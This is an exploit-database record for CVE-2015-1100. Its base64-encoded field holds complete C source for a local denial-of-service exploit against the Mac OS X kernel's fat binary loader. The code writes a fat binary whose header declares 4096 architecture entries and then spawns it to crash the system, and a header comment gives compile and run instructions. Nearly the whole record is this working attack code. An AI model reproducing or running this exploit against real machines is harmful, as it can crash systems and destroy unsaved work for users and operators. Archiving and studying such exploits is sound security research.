{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIDIwMTUsIE1heGltZSBWaWxsYXJkLCBDVkUtMjAxNS0xMTAwDQogKiBMb2NhbCBEb1MgY2F1c2VkIGJ5IGEgbWlzc2luZyBsaW1pdCBjaGVjayBpbiB0aGUgZmF0IGxvYWRlciBvZiB0aGUgTWFjIE9TIFgNCiAqIEtlcm5lbC4NCiAqDQogKiAgJCBnY2MgLW8gTWFjLU9TLVhfRmF0LURvUyBNYWMtT1MtWF9GYXQtRG9TLmMNCiAqICAkIC4vTWFjLU9TLVhfRmF0LURvUyBCSU5BUlktTkFNRQ0KICoNCiAqIE9idGFpbmVkIGZyb206IGh0dHA6Ly9tMDBuYnNkLm5ldC9nYXJiYWdlL01hYy1PUy1YX0ZhdC1Eb1MuYw0KICogQW5hbHlzaXM6ICAgICAgaHR0cDovL20wMG5ic2QubmV0L2dhcmJhZ2UvTWFjLU9TLVhfRmF0LURvUy50eHQNCiAqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHNwYXduLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8ZXJyLmg+DQojaW5jbHVkZSA8bWFjaC1vL2ZhdC5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQoNCiNkZWZpbmUgTUFYTlVNICg0MDk2KQ0KI2RlZmluZSBNQVhOVU0wIChPU1N3YXBCaWdUb0hvc3RJbnQzMihNQVhOVU0pKQ0KDQp2b2lkIENyYWZ0QmluYXJ5KGNoYXIgKm5hbWUpDQp7DQogIHN0cnVjdCBmYXRfaGVhZGVyIGZhdF9oZWFkZXI7DQogIHN0cnVjdCBmYXRfYXJjaCAqYXJjaGVzOw0KICBzaXplX3QgaTsNCiAgaW50IGZkOw0KDQogIG1lbXNldCgmZmF0X2hlYWRlciwgMCwgc2l6ZW9mKGZhdF9oZWFkZXIpKTsNCiAgZmF0X2hlYWRlci5tYWdpYyA9IEZBVF9NQUdJQzsNCiAgZmF0X2hlYWRlci5uZmF0X2FyY2ggPSA0MDk2Ow0KDQogIGlmICgoYXJjaGVzID0gY2FsbG9jKE1BWE5VTTAsIHNpemVvZihzdHJ1Y3QgZmF0X2FyY2gpKSkgPT0gTlVMTCkNCiAgICBlcnIoLTEsICJjYWxsb2MiKTsNCiAgZm9yIChpID0gMDsgaSA8IE1BWE5VTTA7IGkrKykNCiAgICBhcmNoZXNbaV0uY3B1dHlwZSA9IENQVV9UWVBFX0kzODY7DQoNCiAgaWYgKChmZCA9IG9wZW4obmFtZSwgT19DUkVBVHxPX1JEV1IpKSA9PSAtMSkNCiAgICBlcnIoLTEsICJvcGVuIik7DQogIGlmICh3cml0ZShmZCwgJmZhdF9oZWFkZXIsIHNpemVvZihmYXRfaGVhZGVyKSkgPT0gLTEpDQogICAgZXJyKC0xLCAid3JpdGUiKTsNCiAgaWYgKHdyaXRlKGZkLCBhcmNoZXMsIHNpemVvZihzdHJ1Y3QgZmF0X2FyY2gpICogTUFYTlVNMCkgPT0gLTEpDQogICAgZXJyKC0xLCAid3JpdGUiKTsNCiAgaWYgKGZjaG1vZChmZCwgU19JWFVTUikgPT0gLTEpDQogICAgZXJyKC0xLCAiZmNobW9kIik7DQogIGNsb3NlKGZkKTsNCiAgZnJlZShhcmNoZXMpOw0KfQ0KDQp2b2lkIFNwYXduQmluYXJ5KGNoYXIgKm5hbWUpDQp7DQogIGNwdV90eXBlX3QgY3B1c1tdID0geyBDUFVfVFlQRV9IUFBBLCAwIH07DQogIGNoYXIgKmFyZ3ZbXSA9IHsgIkNyYXp5IEhvcnNlIiwgTlVMTCB9Ow0KICBjaGFyICplbnZwW10gPSB7IE5VTEwgfTsNCiAgcG9zaXhfc3Bhd25hdHRyX3QgYXR0cjsgIA0KICBzaXplX3Qgc2V0ID0gMDsNCiAgaW50IHJldDsNCg0KICBpZiAocG9zaXhfc3Bhd25hdHRyX2luaXQoJmF0dHIpID09IC0xKQ0KICAgIGVycigtMSwgInBvc2l4X3NwYXduYXR0cl9pbml0Iik7DQogIGlmIChwb3NpeF9zcGF3bmF0dHJfc2V0YmlucHJlZl9ucCgmYXR0ciwgMiwgY3B1cywgJnNldCkgPT0gLTEpDQogICAgZXJyKC0xLCAicG9zaXhfc3Bhd25hdHRyX3NldGJpbnByZWZfbnAiKTsNCiAgZnByaW50ZihzdGRlcnIsICItLS0tLS0tLS0tLSBHb29kYnllISAtLS0tLS0tLS0tLVxuIik7DQogIHJldCA9IHBvc2l4X3NwYXduKE5VTEwsIG5hbWUsIE5VTEwsICZhdHRyLCBhcmd2LCBlbnZwKTsNCiAgZnByaW50ZihzdGRlcnIsICJIdW0sIHN0aWxsIGFsaXZlLiBZb3UgYXJlIGx1Y2t5IHRvZGF5ISByZXQgPSAlZFxuIiwgcmV0KTsNCn0NCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkNCnsNCiAgaWYgKGFyZ2MgIT0gMikgew0KICAgIHByaW50ZigiVXNhZ2U6ICVzIEJJTkFSWS1OQU1FXG4iLCBhcmd2WzBdKTsNCiAgfSBlbHNlIHsNCiAgICBDcmFmdEJpbmFyeShhcmd2WzFdKTsNCiAgICBTcGF3bkJpbmFyeShhcmd2WzFdKTsNCiAgfQ0KfQ==", 
    "filename": "platforms/osx/dos/36814.c", 
    "id": "36814", 
    "cves": [
        "CVE-2015-1100"
    ]
}